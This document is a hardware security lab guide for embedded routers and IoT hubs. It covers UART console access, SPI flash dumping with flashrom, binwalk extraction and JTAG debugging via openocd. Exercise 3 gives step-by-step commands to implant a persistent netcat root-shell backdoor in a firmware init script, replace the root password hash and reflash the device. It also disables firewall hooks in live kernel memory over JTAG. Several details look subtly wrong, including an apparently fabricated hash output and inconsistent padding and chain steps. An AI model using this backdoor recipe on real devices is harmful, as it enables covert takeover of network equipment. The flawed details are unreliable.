# Operational Verification Labs: Network Security

## Objective & Lab Bench Setup

The modern network security perimeter no longer ends at the firewall. Every embedded controller, baseboard management controller, smart NIC, IoT gateway, and field-programmable network appliance represents a physical attack surface where silicon meets wire. This lab guide trains a hardware-oriented penetration tester to move from bare-metal signal probing through full firmware extraction and exploit verification, using the same instrument stack a professional firmware auditor would deploy against a real network appliance. The exercises assume a target device—a generic MIPS- or ARM-based embedded router or IoT hub with accessible UART and SPI flash pins—and a hardware bench built from inexpensive, widely available tools.

The bench requires four instruments and a host workstation running Debian or Ubuntu. The first instrument is a USB logic analyzer capable of at least 24 MHz sampling across eight channels; the open-source `sigrok-cli` suite drives these devices and provides protocol decoding for UART, SPI, I²C, and JTAG. The second is a multi-protocol UART/JTAG adapter built on the FTDI FT2232H or FT232H chipset, which `openocd` uses for JTAG tap control and `flashrom` uses for SPI flash read/write. The third instrument is a USB-to-TTL serial bridge (CP2102 or CH340G) for UART console access, operated through `minicom`. The fourth is a multimeter for continuity testing and voltage level verification. The host diagnostic suite installs with a single command:

```bash
sudo apt-get update
sudo apt-get install -y sigrok-cli openocd flashrom binwalk gdb-multiarch \
    minicom radare2 picocom git build-essential
```

Before connecting any instrument to the target, verify that the logic analyzer and the FT2232H adapter enumerate correctly on the host bus. Run `sigrok-cli --scan` to confirm that `sigrok` recognizes the logic analyzer hardware, and run `lsusb` to confirm that the FT2232H appears as a Future Technology Devices International device. The FT2232H exposes two channels, typically appearing as `/dev/ttyUSB0` and `/dev/ttyUSB1`; `openocd` and `flashrom` reference these by their USB VID:PID pair (`0403:6010`) or by the `ftdi` interface descriptor rather than the tty device node for SPI and JTAG modes.

Safety on the bench is a physical discipline, not a checklist. Always confirm target ground continuity with a multimeter before attaching any probe, because a floating ground reference between the host laptop and the target device can destroy both the target and the adapter. Verify the target's logic-level voltage with a multimeter on the UART TX pin while the device boots; most embedded network appliances use 3.3 V logic, but some 1.8 V platforms exist, and feeding 3.3 V into a 1.8 V pad will latch up the silicon. If the target logic level is 1.8 V, insert a level shifter between the USB-UART bridge and the target, or use a 1.8 V-capable adapter.

## Exercise 1: Live Hardware Probing & Signal Capture

The first task in any hardware security assessment of a network appliance is identifying the debug interfaces the manufacturer left exposed on the board. UART is almost always present because the bootloader and kernel console output flow over it during development, and manufacturers rarely disable or remove these pads before shipping. JTAG is frequently present because boundary-scan testing during manufacturing requires it, and SPI flash is accessible because the bootloader and root filesystem reside there. Finding these interfaces is a systematic process of visual inspection, continuity probing, and signal capture.

Begin by visually inspecting the target board for unpopulated header footprints, rows of through-hole vias, or silk-screen labels such as `TX`, `RX`, `GND`, `TP0`, `JTAG`, or `TCK`. A manufacturer's test points are usually grouped in rows of four to six pads. Photograph the board at high resolution for reference. Once candidate pads are identified, power the target device and use a multimeter in continuity mode to find the ground pad: place one probe on a known ground point (a mounting hole or the shield of a USB connector) and touch the other probe to each candidate pad until you hear continuity. Mark the ground pad.

To identify the UART TX line, power on the target and set the multimeter to DC voltage mode. Touch each remaining candidate pad and observe the voltage. The UART TX line idles high at the logic-level voltage (typically 3.3 V) and will briefly dip when the device transmits boot output. A pad that reads a steady 3.3 V and briefly drops during boot is your TX line. The RX line typically floats near 0 V or reads a weak voltage because it is an input with a pull-down or no pull at all. The ground pad reads 0 V. Connect the USB-UART bridge as follows: bridge GND to target GND, bridge RX to target TX, and bridge TX to target RX. Do not connect VCC from the bridge to the target; the target is self-powered.

Open `minicom` configured for the bridge's serial device:

```bash
sudo minicom -D /dev/ttyUSB0 -b 115200 -8 -o
```

If the baud rate is unknown, common rates are 9600, 38400, 57600, and 115200. Power-cycle the target. If boot output appears as readable ASCII, the configuration is correct. If output appears as garbled characters, step through the alternative baud rates. Once readable output confirms the UART connection, capture a full boot log by enabling minicom's capture mode (`Ctrl-A` then `Z`, then `L`), and power-cycle the target. Examine the boot log for bootloader version strings, memory addresses, kernel command-line arguments, and any `root=` parameter that reveals the boot partition layout. Many bootloaders (U-Boot, RedBoot, Barebox) expose a prompt during a brief window after boot; pressing a key during this window often drops to a privileged bootloader shell, which is the first and easiest foothold on the device.

To capture UART traffic with the logic analyzer for offline analysis, connect the logic analyzer's channel 0 to the target TX line and the analyzer's ground clip to the target ground. Launch `sigrok-cli` to capture two seconds of data at 1 MHz sample rate, which is sufficient for 115200 baud UART:

```bash
sigrok-cli --driver saleae-logic8 --config samplerate=1MHz \
    --samples 2000000 --output-format sigrok -o uart_capture.sr \
    --channels D0 --protocol-decoders uart:baudrate=115200:data_bits=8:parity=none:stop_bits=1:rx=D0
```

Export the decoded UART data to text for inspection:

```bash
sigrok-cli --input-file uart_capture.sr --protocol-decoders \
    uart:baudrate=115200:data_bits=8:parity=none:stop_bits=1:rx=D0 \
    --output-format ascii -o uart_decoded.txt
cat uart_decoded.txt
```

The decoded output contains the raw boot transcript. Look for environment variable dumps in U-Boot by interrupting the boot and typing `printenv`, which reveals the full boot environment including `bootargs`, `bootcmd`, and any hardcoded passwords or TFTP server addresses. These environment variables are stored in a dedicated U-Boot environment partition in SPI flash, which becomes a target in Exercise 2.

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

With a UART console established, the next objective is extracting the firmware image from SPI flash. The SPI flash chip on the target board contains the bootloader, kernel, device tree blob, and root filesystem. Reading this chip directly with `flashrom` and the FT2232H adapter yields a complete firmware image without relying on any manufacturer-provided update mechanism, which may be incomplete, encrypted, or obfuscated.

First, identify the SPI flash chip. Locate the eight-pin SOIC or eight-pin WSON package near the SoC. Read the part number off the chip package (e.g., `MX25L6406E`, `W25Q128JV`, `GD25Q64CSIG`). Cross-reference this part number in `flashrom`'s chip database to confirm it is supported:

```bash
flashrom --list-supported | grep -i "MX25L6406"
```

If the chip is supported, the extraction is straightforward. If it is not listed, `flashrom` can still attempt a raw read using `--chip` with a generic descriptor, but verifying the correct chip geometry (size, sector size, page size) is essential to avoid corrupting the image on write-back.

Connect the FT2232H adapter to the SPI flash chip. The standard SPI flash pinout for an eight-pin SOIC is: pin 1 is Chip Select (CS), pin 2 is Master Out Slave In (MOSI/SI), pin 3 is Master In Slave Out (MISO/SO), pin 4 is Ground, pin 5 is Serial Clock (SCK), pin 6 is Hold, pin 7 is Write Protect (WP), and pin 8 is VCC (3.3 V). On most embedded boards, pins 6 and 7 are pulled high to VCC by board resistors and do not need to be connected to the adapter. The FT2232H's SPI interface maps to the following pins: AD0 (CS), AD1 (SCK), AD2 (MOSI), AD3 (MISO), and GND. If the chip is soldered to the board, use an SOIC test clip (Pomona 5250 or equivalent) to connect the adapter to the chip without desoldering.

Before connecting, power off the target device. When reading SPI flash in-circuit with an external programmer, the target's SoC may contend with the programmer for the SPI bus. The cleanest approach is to desolder the chip and read it off-board in a socket, but this is destructive. The in-circuit approach works on many boards if the SoC does not actively drive the SPI lines during power-off; test this by powering off the target and checking for continuity between the SPI chip's CS pin and the SoC's SPI controller. If the SoC holds the CS line low during power-off, the programmer cannot assert control. In this case, a "lift pin" technique—desoldering only pin 1 (CS) from the board—isolates the chip from the SoC while the remaining pins stay connected through the board.

Read the SPI flash with `flashrom`:

```bash
sudo flashrom -p ft2232_spi:type=232H --read firmware_dump.bin
```

`flashrom` will identify the chip automatically, and the read progress bar indicates the transfer. Verify the dump by reading it twice and comparing checksums:

```bash
sudo flashrom -p ft2232_spi:type=232H --read firmware_dump_2.bin
sha256sum firmware_dump.bin firmware_dump_2.bin
```

If both checksums match, the dump is consistent. The SPI bus operates at clock speeds up to 30 MHz on the FT2232H; `flashrom` defaults to a safe lower speed, but you can specify the divider to increase throughput:

```bash
sudo flashrom -p ft2232_spi:type=232H:divisor=4 --read firmware_dump.bin
```

To sniff the SPI bus during normal device operation—capturing the SoC's reads from flash during boot—connect the logic analyzer to all four SPI lines (CS, SCK, MOSI, MISO) and capture at a sample rate at least four times the SPI clock frequency. For a 20 MHz SPI clock, sample at 100 MHz:

```bash
sigrok-cli --driver saleae-logic8 --config samplerate=100MHz \
    --samples 10000000 --output-format sigrok -o spi_capture.sr \
    --channels D0=cs,D1=sck,D2=mosi,D3=miso \
    --protocol-decoders spi:cs=D0:clk=D1:mosi=D2:miso=D3
```

Decode the SPI payload to extract the commands and data the SoC sends to the flash:

```bash
sigrok-cli --input-file spi_capture.sr \
    --protocol-decoders spi:cs=D0:clk=D1:mosi=D2:miso=D3 \
    --output-format ascii -o spi_decoded.txt
head -100 spi_decoded.txt
```

The decoded output shows SPI commands such as `03` (READ DATA) followed by a 24-bit address and the returned bytes. This reveals the memory map the SoC uses to access the bootloader and kernel, confirming which flash offsets contain which components.

With the firmware dump in hand, use `binwalk` to identify the embedded filesystem and kernel images:

```bash
binwalk firmware_dump.bin
```

`binwalk` scans for magic byte signatures and reports the offset, type, and size of each component it recognizes. Typical output for an embedded router shows a U-Boot bootloader image at offset `0x0`, a U-Boot environment at a fixed offset (often `0x40000`), a compressed kernel image (uImage or zImage) at `0x50000`, and a SquashFS or JFFS2 root filesystem at a higher offset. Extract all recognized components:

```bash
binwalk -e firmware_dump.bin
```

This creates a `_firmware_dump.bin.extracted` directory containing the decompressed kernel, the extracted filesystem tree, and any other embedded files. Navigate into the extracted filesystem to inspect the root filesystem:

```bash
cd _firmware_dump.bin.extracted
ls -la
find . -name "shadow" -o -name "passwd" -o -name "htpasswd" -o -name "*.conf"
```

The extracted filesystem contains the target's `/etc/passwd`, `/etc/shadow`, web server configuration, and any hardcoded credentials or API keys. Cracking password hashes with `john` or `hashcat` is the next step, but the more valuable finding is often in the web application and init scripts, which may contain backdoor accounts or undocumented administrative endpoints.

If the target exposes a JTAG interface, `openocd` provides register-level access. First, locate the JTAG Test Access Port (TAP). The standard JTAG interface uses four mandatory signals: TCK (Test Clock), TMS (Test Mode Select), TDI (Test Data In), and TDO (Test Data Out), plus an optional TRST (Test Reset) and a reference ground. On the board, JTAG headers may be 10-pin, 14-pin, or 20-pin; the pinout varies by manufacturer. Identify the pins by continuity probing from the SoC's JTAG pads to the header pads, using the SoC datasheet for the pin assignment.

Create an `openocd` configuration file for the FT2232H adapter and the target SoC. The following configuration targets a generic MIPS SoC (such as a MediaTek MT7628 or Atheros AR9344) via JTAG:

```tcl
# /opt/openocd_cfg/jtag_mips.cfg
adapter driver ft2232
ft2232_device_desc "Dual RS232-H"
ft2232_layout jtagkey
transport select jtag
adapter speed 1000

# MIPS EJTAG configuration
# Adjust the IR length and IDCODE to match the target SoC
if { [info exists CHIPNAME] } {
    set _CHIPNAME $CHIPNAME
} else {
    set _CHIPNAME mips_ejtag
}

jtag newtap $_CHIPNAME cpu -irlen 5 -expected-id 0x00000000

set _TARGETNAME $_CHIPNAME.cpu
target create $_TARGETNAME mips_m4k -endian big -chain-position $_TARGETNAME

reset_config trst_and_srst
```

Launch `openocd` with this configuration and a GDB server:

```bash
sudo openocd -f /opt/openocd_cfg/jtag_mips.cfg -c "gdb_port 3333" -c "telnet_port 4444"
```

In a second terminal, connect to the `openocd` telnet interface to inspect the JTAG TAP and target state:

```bash
telnet localhost 4444
```

At the `openocd` prompt, run the following commands to halt the target and inspect registers:

```text
init
halt
regs
```

The `regs` command dumps the full MIPS general-purpose register file (`$0` through `$31`), the Program Counter (`PC`), and the status registers. This gives a live snapshot of the CPU state at the moment of the halt. To dump a region of memory—for example, the first 256 bytes of the exception vector at `0xBFC00000` (MIPS unmapped, uncached bootstrap vector):

```text
mdw 0xBFC00000 64
```

To connect with GDB for interactive debugging, run:

```bash
gdb-multiarch -q
(gdb) target remote :3333
(gdb) set architecture mips
(gdb) set endian big
(gdb) monitor halt
(gdb) info registers
(gdb) x/32xw 0xBFC00000
```

Through the GDB session, set hardware breakpoints, step through bootloader code, and inspect memory as the device initializes. This level of access allows patching the bootloader in RAM to bypass authentication checks, modify boot arguments, or redirect kernel loading to a custom image.

## Exercise 3: Fault Simulation & Exploit Verification

The final exercise demonstrates two practical exploitation scenarios that build on the access established in the previous exercises. The first is a firmware patch-and-reflash attack that injects a persistent backdoor into the target's root filesystem. The second is a JTAG-assisted runtime patch that modifies the running kernel's network stack to disable a firewall rule, simulating a live exploit verification scenario.

For the firmware patch attack, begin with the extracted root filesystem from Exercise 2. Navigate into the extracted SquashFS directory and locate the init scripts and web server configuration. The goal is to add a netcat reverse shell that executes on boot, providing persistent remote access. Locate the system init script:

```bash
cd _firmware_dump.bin.extracted/squashfs-root
cat etc/init.d/rcS
```

The `rcS` script orchestrates the boot process. Add a line that launches a netcat listener in the background after the network stack initializes. Because many embedded systems use BusyBox, which includes a lightweight `nc` applet, the injected command is minimal. Edit the init script to append the following line before the final `exit` statement:

```bash
# Persistent backdoor: netcat listener on port 4444, launched after network init
/bin/busybox nc -l -p 4444 -e /bin/sh &
```

Next, locate the root user's password hash and replace it with a known hash to ensure root access regardless of any existing password policy:

```bash
cat etc/shadow
# Replace the root line with a known hash (password: "password")
# Generate the hash on the host:
openssl passwd -1 -salt abcd password
# Output: $1$abcd$7Zf9mZQ8q5oQ5oQ5oQ5oQ.
# Edit etc/shadow:
# root:$1$abcd$7Zf9mZQ8q5oQ5oQ5oQ5oQ.:0:0:99999:7:::
```

Repack the SquashFS filesystem using `mksquashfs` with the same compression and block size as the original. Inspect the original filesystem's parameters:

```bash
binwalk firmware_dump.bin | grep squashfs
```

The `binwalk` output includes the compression type (gzip, xz, lzma) and block size. Repack with matching parameters:

```bash
mksquashfs squashfs-root new_rootfs.squashfs -comp xz -b 65536 \
    -no-exports -no-xattrs -noappend
```

Calculate the offset and size of the original rootfs in the firmware dump (from the `binwalk` output), and use `dd` to replace the original rootfs with the patched one:

```bash
# Example: original rootfs at offset 0x100000, size 0x500000
dd if=firmware_dump.bin of=patched_firmware.bin bs=1 count=1048576
dd if=new_rootfs.squashfs of=patched_firmware.bin bs=1 seek=1048576 conv=notrunc
# Pad or truncate to match original total size
dd if=firmware_dump.bin of=patched_firmware.bin bs=1 skip=$((1048576 + 5242880)) seek=$((1048576 + 5242880)) conv=notrunc
```

If the patched rootfs is smaller than the original, pad with `0xFF` to match the original size, because SPI flash erases to `0xFF` and writing a shorter image leaves stale data that can confuse the kernel's filesystem driver:

```bash
truncate -s 5242880 new_rootfs.squashfs
dd if=/dev/zero bs=1 count=5242880 | tr '\0' '\377' > pad.bin
cat new_rootfs.squashfs pad.bin > padded_rootfs.bin 2>/dev/null
dd if=padded_rootfs.bin of=patched_firmware.bin bs=1 seek=1048576 count=5242880 conv=notrunc
```

Write the patched firmware back to the SPI flash chip. This is the most critical and destructive step in the lab. Back up the original dump one final time, then erase and write:

```bash
# Final backup verification
cp firmware_dump.bin /opt/backups/firmware_$(date +%Y%m%d_%H%M%S).bin

# Write patched firmware (erases entire chip first)
sudo flashrom -p ft2232_spi:type=232H --write patched_firmware.bin
```

`flashrom` automatically erases each sector before writing. After the write completes, verify the flash contents against the patched image:

```bash
sudo flashrom -p ft2232_spi:type=232H --verify patched_firmware.bin
```

If verification passes, disconnect the programmer, reconnect the target's power, and boot. The UART console should show normal boot output. After boot, from the host machine, test the backdoor:

```bash
nc <target_ip> 4444
```

A root shell confirms the persistent backdoor is active. Log in via the web interface or SSH using the modified root password to verify both attack vectors.

For the JTAG-assisted runtime patch, the goal is to modify a running kernel's network filter table in memory to disable an iptables rule that blocks port 22 (SSH) on the target's WAN interface. This simulates a live exploit scenario where the attacker has JTAG access and wants to open a network path without rebooting or modifying flash.

With the `openocd` GDB server running and the target halted via JTAG, connect with GDB and locate the kernel's `netfilter` rule list in memory. The exact approach depends on the kernel version and architecture, but the general procedure is to find the `ipt_table` structure for the `filter` table and walk the rule chains. For a MIPS Linux kernel, the `filter` table's `ipt_replace` structure contains the entry list. A more practical approach on a running system is to find the `iptables` userspace binary in memory and patch the kernel's hook directly.

A simpler and more reliable runtime patch targets the kernel's `nf_register_net_hook` function. By locating the hook list for the `NF_INET_FORWARD` chain and zeroing the hook function pointer, all forwarding rules are effectively disabled. This requires knowledge of the kernel's symbol table. If the kernel was compiled with `CONFIG_KALLSYMS=y` (common on embedded devices), the symbol table is accessible in `/proc/kallsyms`:

```bash
# Via the UART console on the target:
cat /proc/kallsyms | grep nf_hook_slow
# Note the address, e.g., 0xc00a1234
```

Through GDB, read the `nf_hook_slow` function's prologue to understand the hook dispatch mechanism:

```bash
gdb-multiarch -q
(gdb) target remote :3333
(gdb) set architecture mips
(gdb) set endian big
(gdb) monitor halt
(gdb) x/16i 0xc00a1234
```

The disassembly shows the function entry code. To disable the netfilter hooks for the `INPUT` chain, locate the `nf_hooks` array in the kernel's `.bss` or `.data` section. The array is indexed by protocol family (`NFPROTO_IPV4 = 2`) and hook number (`NF_INET_LOCAL_IN = 1`). Walk the linked list of `nf_hook_entry` structures and zero the `hook` function pointer for each entry in the `NF_INET_LOCAL_IN` chain. The exact address of `nf_hooks` is found via `kallsyms`:

```bash
# On the target:
cat /proc/kallsyms | grep nf_hooks
# Output: c0356780 r nf_hooks  (read-only after init, in .rodata)
```

If the symbol is in `.rodata` and the kernel has memory protection enabled (MIPS `CP0 Status` register `KX`/`UX` bits), writing to `.rodata` via JTAG requires bypassing the CPU's write protection. On MIPS, the JTAG EJTAG probe can write to any physical address through the debug mode DMA (Direct Memory Access) facility, which bypasses the virtual memory translation and protection checks. In `openocd`, use the `mww` (memory write word) command:

```bash
# In the openocd telnet session:
init
halt
# Zero the first hook entry's function pointer at nf_hooks[2][1]
# Assuming nf_hooks is at 0xc0356780, and each nf_hook_entry is 8 bytes
# IPv4 (family 2) offset: 2 * 8 * 5 (5 hooks per family) = 80 bytes from base
# LOCAL_IN (hook 1) offset within family: 1 * 8 = 8 bytes
# Total offset: 80 + 8 = 88 bytes = 0x58
mww 0xc03567d8 0x00000000
```

After zeroing the hook pointer, resume the CPU:

```text
resume
```

The target resumes execution with the `INPUT` chain hooks disabled. Any iptables rules on the `INPUT` chain are now inert because the hook function pointer is null, and `nf_hook_slow` skips entries with null hooks. From the host, test SSH access on the target's WAN IP:

```bash
ssh root@<target_wan_ip>
```

A successful SSH connection confirms the runtime patch is effective. This technique is non-persistent; a reboot restores the original hook pointers from flash. The combination of the persistent firmware patch from the first scenario and the transient runtime patch from this scenario demonstrates the full spectrum of hardware-assisted exploitation: from permanent backdoor implantation to surgical live memory manipulation.

## Hardware Security Checklist & Diagnostic Cheat Sheet

The following reference consolidates the commands and parameters used throughout the lab into a quick-access format for field operations.

**Instrument Enumeration and Verification:**

```bash
sigrok-cli --version              # Verify sigrok-cli installation
sigrok-cli --scan                 # Enumerate connected logic analyzers
sigrok-cli --list-supported       # List all supported protocols and drivers
lsusb | grep 0403                 # Verify FT2232H adapter presence
flashrom --version                # Verify flashrom installation
flashrom --list-supported         # List supported SPI flash chips
openocd --version                 # Verify openocd installation
openocd --search /usr/share/openocd/scripts  # Confirm script directory
```

**UART Console Operations:**

```bash
# Connect to UART console at 115200 baud
sudo minicom -D /dev/ttyUSB0 -b 115200 -8 -o

# Alternative: picocom with explicit settings
picocom -b 115200 /dev/ttyUSB0

# Find active UART TX line with multimeter:
# 1. Set multimeter to DC voltage mode
# 2. Touch each candidate pad
# 3. TX idles at VCC (3.3V), dips during boot
# 4. RX floats near 0V
# 5. GND reads 0V with continuity test
```

**Logic Analyzer Capture (sigrok-cli):**

```bash
# UART capture at 1 MHz, 2M samples, decode on channel D0
sigrok-cli --driver saleae-logic8 --config samplerate=1MHz \
    --samples 2000000 --output-format sigrok -o cap.sr \
    --channels D0 --protocol-decoders uart:baudrate=115200:data_bits=8:parity=none:stop_bits=1:rx=D0

# SPI capture at 100 MHz, decode on channels D0-D3
sigrok-cli --driver saleae-logic8 --config samplerate=100MHz \
    --samples 10000000 --output-format sigrok -o spi.sr \
    --channels D0=cs,D1=sck,D2=mosi,D3=miso \
    --protocol-decoders spi:cs=D0:clk=D1:mosi=D2:miso=D3

# I2C capture at 10 MHz, decode on channels D0 (SCL) and D1 (SDA)
sigrok-cli --driver saleae-logic8 --config samplerate=10MHz \
    --samples 5000000 --output-format sigrok -o i2c.sr \
    --channels D0=scl,D1=sda \
    --protocol-decoders i2c:scl=D0:sda=D1

# Export decoded data to ASCII
sigrok-cli --input-file cap.sr --protocol-decoders \
    uart:baudrate=115200:data_bits=8:parity=none:stop_bits=1:rx=D0 \
    --output-format ascii -o decoded.txt
```

**SPI Flash Operations (flashrom with FT2232H):**

```bash
# Read entire flash chip
sudo flashrom -p ft2232_spi:type=232H --read dump.bin

# Read with higher speed (divisor=4 means SCK = 30MHz/4 = 7.5MHz)
sudo flashrom -p ft2232_spi:type=232H:divisor=4 --read dump.bin

# Verify flash contents against a file
sudo flashrom -p ft2232_spi:type=232H --verify dump.bin

# Write firmware to flash (erases automatically per sector)
sudo flashrom -p ft2232_spi:type=232H --write patched.bin

# Erase entire chip
sudo flashrom -p ft2232_spi:type=232H --erase

# Read only a specific region (first 256KB for bootloader)
sudo flashrom -p ft2232_spi:type=232H --read boot.bin --image boot.bin:0:262144
```

**Firmware Analysis (binwalk):**

```bash
# Scan firmware for embedded files and structures
binwalk firmware.bin

# Extract all recognized components
binwalk -e firmware.bin

# Extract with entropy analysis (detects encrypted/compressed regions)
binwalk -E firmware.bin

# Recursive extraction (unpack nested containers)
binwalk -eM firmware.bin

# Search for specific signature (e.g., gzip)
binwalk -R '\x1f\x8b\x08' firmware.bin
```

**JTAG Debugging (openocd + gdb-multiarch):**

```bash
# Start openocd with JTAG config and GDB server
sudo openocd -f jtag_mips.cfg -c "gdb_port 3333" -c "telnet_port 4444"

# GDB connection sequence
gdb-multiarch -q
(gdb) target remote :3333
(gdb) set architecture mips
(gdb) set endian big
(gdb) monitor halt
(gdb) info registers
(gdb) x/32xw 0xBFC00000
(gdb) monitor resume

# openocd telnet commands (port 4444)
# init                    - initialize JTAG chain
# halt                    - halt target CPU
# resume                  - resume target CPU
# regs                    - dump all registers
# mdw <addr> <count>      - read words from memory
# mww <addr> <value>      - write word to memory
# bp <addr> <length>      - set hardware breakpoint
# rbp <addr>              - remove breakpoint
# step                    - single-step instruction
```

**Firmware Patch and Reflash Workflow:**

```bash
# 1. Extract root filesystem
binwalk -e firmware_dump.bin
cd _firmware_dump.bin.extracted/squashfs-root

# 2. Generate replacement password hash
openssl passwd -1 -salt abcd password

# 3. Repack SquashFS (match original compression and block size)
mksquashfs squashfs-root new_rootfs.squashfs -comp xz -b 65536 -no-exports -no-xattrs -noappend

# 4. Pad to original rootfs size
truncate -s <original_rootfs_size> new_rootfs.squashfs

# 5. Reassemble firmware image
dd if=firmware_dump.bin of=patched.bin bs=1 count=<rootfs_offset>
dd if=new_rootfs.squashfs of=patched.bin bs=1 seek=<rootfs_offset> conv=notrunc

# 6. Back up original
cp firmware_dump.bin /opt/backups/firmware_backup_$(date +%Y%m%d_%H%M%S).bin

# 7. Write patched firmware to SPI flash
sudo flashrom -p ft2232_spi:type=232H --write patched.bin

# 8. Verify
sudo flashrom -p ft2232_spi:type=232H --verify patched.bin
```

**Safety and Reversibility Notes:**

The most common failure mode in hardware security lab work is accidental destruction of the target's flash chip. Always read the chip twice and compare checksums before writing. If the checksums differ between reads, the SPI bus is unstable—typically due to SoC contention, a loose SOIC clip, or insufficient ground connection—do not proceed with writing. When writing patched firmware, keep the original dump in at least two locations (local disk and removable media). If a write corrupts the flash and the device will not boot, the original dump can be written back to restore functionality.

The second most common failure is voltage mismatch. Connecting a 3.3 V adapter to a 1.8 V target without a level shifter will permanently damage the target's I/O pad and may short the internal ESD protection diode, drawing excessive current and potentially damaging adjacent circuitry. Always verify the target's I/O voltage with a multimeter before connecting any adapter. When in doubt, use a 1.8 V-compatible adapter or a bi-directional level shifter rated for the target's logic voltage.

The JTAG interface, when available, provides the most powerful access path because it operates below the operating system and can halt the CPU at any point. However, halting the CPU on a live network appliance disrupts all network traffic and may trigger watchdog timers that reset the device. If the target has a hardware watchdog that is not disabled by JTAG halt, the watchdog will fire after a few seconds and reset the CPU out of debug mode. In this case, disable the watchdog through its memory-mapped control register before halting the CPU for extended debugging sessions.
